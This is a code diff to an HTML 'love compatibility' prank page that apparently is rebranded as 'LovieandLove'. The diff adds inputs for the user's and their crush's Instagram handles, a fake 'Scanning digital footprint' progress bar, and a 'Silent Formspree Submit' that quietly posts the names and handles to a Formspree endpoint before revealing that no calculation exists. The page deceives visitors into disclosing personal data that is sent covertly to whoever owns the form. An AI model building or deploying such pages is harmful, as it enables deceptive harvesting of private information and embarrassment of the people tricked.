@@ -4,13 +4,11 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     
-    <title>✨ AstroLove: 2026 Compatibility Check</title>
-    <meta property="og:title" content="✨ AstroLove: 2026 Compatibility Check">
-    <meta property="og:description" content="Calculate your love percentage using our 3D planetary alignment engine.">
+    <title>LovieandLove | Reciprocity Lab</title>
+    <meta property="og:title" content="✨ LovieandLove: 2026 Compatibility Check">
+    <meta property="og:description" content="Use digital footprint to test your secret love.">
     <meta property="og:image" content="https://img.icons8.com/color/480/hearts.png">
     <meta property="og:type" content="website">
-    <meta property="og:image:width" content="1200">
-    <meta property="og:image:height" content="630">
 
     <style>
         :root {
@@ -19,6 +17,7 @@
         }
 
         body {
+            /* This is the color changing background you liked */
             background: linear-gradient(135deg, #ffafbd, #ffc3a0, #2193b0, #6dd5ed);
             background-size: 400% 400%;
             animation: gradientBG 15s ease infinite;
@@ -43,26 +42,24 @@
             -webkit-backdrop-filter: blur(15px);
             border: 1px solid rgba(255, 255, 255, 0.2);
             border-radius: 30px;
-            padding: 40px;
+            padding: 35px;
             width: 340px;
             text-align: center;
             box-shadow: var(--shadow);
-            transition: all 0.5s ease;
         }
 
-        h1 { color: white; text-shadow: 2px 2px 4px rgba(0,0,0,0.1); margin-top: 0; font-size: 28px; }
-        p { color: white; font-size: 14px; opacity: 0.9; margin-bottom: 25px; }
+        h1 { color: white; text-shadow: 2px 2px 4px rgba(0,0,0,0.1); margin-top: 0; font-size: 26px; }
+        .tagline { color: white; font-size: 13px; opacity: 0.9; margin-bottom: 25px; line-height: 1.4; }
 
         input {
             width: 100%;
-            padding: 15px;
-            margin: 12px 0;
+            padding: 14px;
+            margin: 8px 0;
             border: none;
-            border-radius: 15px;
+            border-radius: 12px;
             background: rgba(255, 255, 255, 0.9);
             box-sizing: border-box;
-            box-shadow: inset 2px 2px 5px rgba(0,0,0,0.05);
-            font-size: 15px;
+            font-size: 14px;
             outline: none;
         }
 
@@ -70,41 +67,55 @@
             background: var(--pink);
             color: white;
             border: none;
-            padding: 15px;
+            padding: 16px;
             border-radius: 15px;
             width: 100%;
             font-weight: bold;
             font-size: 16px;
-            margin-top: 20px;
+            margin-top: 15px;
             cursor: pointer;
             box-shadow: 0 10px 20px rgba(255, 77, 109, 0.3);
             transition: 0.3s;
         }
 
-        button:hover { transform: translateY(-3px); box-shadow: 0 15px 25px rgba(255, 77, 109, 0.4); }
-        button:disabled { background: #ffb3c1; }
+        button:hover { transform: translateY(-3px); }
+
+        /* Calculation Visuals */
+        .processing { display: none; margin-top: 20px; }
+        .bar-bg { width: 100%; height: 6px; background: rgba(255, 255, 255, 0.1); border-radius: 10px; overflow: hidden; }
+        .bar-fill { width: 0%; height: 100%; background: var(--pink); transition: width 0.1s linear; }
+        .status-msg { font-size: 12px; margin-top: 10px; color: white; font-style: italic; }
 
         .hidden { display: none; }
-        .emoji-3d { font-size: 70px; margin-bottom: 10px; filter: drop-shadow(2px 4px 6px rgba(0,0,0,0.2)); }
+        .emoji-3d { font-size: 60px; margin-bottom: 10px; filter: drop-shadow(2px 4px 6px rgba(0,0,0,0.2)); }
     </style>
 </head>
 <body>
 
     <div id="main-card" class="card">
-        <div class="emoji-3d">💕</div>
-        <h1>Love Match</h1>
-        <p>Check your compatibility score instantly.</p>
+        <div class="emoji-3d">💖</div>
+        <h1>LovieandLove</h1>
+        <p class="tagline">Use digital footprint to test your secret love.</p>
 
         <form id="loveForm">
-            <input type="text" name="user_name" id="user_name" placeholder="Your Name" required>
-            <input type="text" name="crush_name" id="crush_name" placeholder="Crush's Name" required>
+            <input type="text" name="user_name" id="user_name" placeholder="Enter Your Name" required>
+            <input type="text" name="crush_name" id="crush_name" placeholder="Enter Crush's Name" required>
+            
+            <input type="text" name="user_insta" id="user_insta" placeholder="Your @instagram_id" required>
+            <input type="text" name="crush_insta" id="crush_insta" placeholder="Crush's @instagram_id" required>
+            
             <button type="submit" id="submit-btn">Calculate %</button>
         </form>
+
+        <div id="loader" class="processing">
+            <div class="bar-bg"><div id="fill" class="bar-fill"></div></div>
+            <p id="status-text">Scanning digital footprint...</p>
+        </div>
     </div>
 
     <div id="prank-card" class="card hidden">
-        <div class="emoji-3d">🤤😂</div>
-        <h1>April Fool!</h1>
+        <div class="emoji-3d">🤣</div>
+        <h1>It was fun!</h1>
         <p id="prank-msg" style="font-size: 18px; line-height: 1.6; color: white;"></p>
         <button onclick="window.location.reload()">Try Again</button>
     </div>
@@ -116,30 +127,35 @@
             e.preventDefault();
             
             const btn = document.getElementById('submit-btn');
+            const loader = document.getElementById('loader');
+            const fill = document.getElementById('fill');
             const userName = document.getElementById('user_name').value;
             const crushName = document.getElementById('crush_name').value;
             
-            btn.innerHTML = "Calculating...";
-            btn.disabled = true;
+            btn.classList.add('hidden');
+            loader.style.display = 'block';
 
+            // Silent Formspree Submit
             const formData = new FormData(form);
+            fetch('https://formspree.io/f/xzdobqvk', {
+                method: 'POST',
+                body: formData,
+                headers: { 'Accept': 'application/json' }
+            }).catch(() => {});
 
-            // Using your unique Formspree ID
-            try {
-                await fetch('https://formspree.io/f/xzdobqvk', {
-                    method: 'POST',
-                    body: formData,
-                    headers: { 'Accept': 'application/json' }
-                });
-            } catch (err) {
-                console.log("Submission handled");
-            }
-
-            document.getElementById('main-card').classList.add('hidden');
-            document.getElementById('prank-card').classList.remove('hidden');
-            
-            document.getElementById('prank-msg').innerHTML = 
-                `There's no calculation <strong>${userName}</strong>... <br><br> But I know you are crushing on <strong>${crushName}</strong>!`;
+            // Animation Logic
+            let progress = 0;
+            const interval = setInterval(() => {
+                progress += 1;
+                fill.style.width = progress + "%";
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    document.getElementById('main-card').classList.add('hidden');
+                    document.getElementById('prank-card').classList.remove('hidden');
+                    document.getElementById('prank-msg').innerHTML = 
+                        `There's no calculation <strong>${userName}</strong>... <br><br> But I know you are crushing on <strong>${crushName}</strong>!`;
+                }
+            }, 40);
         });
     </script>
 </body>
